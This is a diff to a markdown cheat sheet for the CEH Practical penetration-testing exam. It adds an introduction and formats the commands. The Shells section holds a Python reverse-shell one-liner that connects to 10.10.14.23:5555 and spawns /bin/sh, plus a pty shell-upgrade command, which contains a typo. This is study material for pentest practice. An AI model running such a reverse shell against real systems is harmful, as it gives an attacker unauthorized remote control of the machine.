@@ -1,5 +1,6 @@
 # CEH-Practical-Cheatsheet
-For this exam I'm writing
+
+This is a quick cheat sheet to refer to when practising for the CEH practical exam. The exam assesses your skills in attacking common services such as FTP, SMB and your enumeration skills. This is not a hard exam and is perfect for beginner pentesters.
 
 ## NMAP
 
@@ -99,10 +100,10 @@ For this exam I'm writing
 
 ## Shells
 
-"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.23\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.23\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'`
 
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 ### after obtaining shell
 
-python -c 'ímport pty;pty.spawn("/bin/sh")'
+`python -c 'ímport pty;pty.spawn("/bin/sh")'`
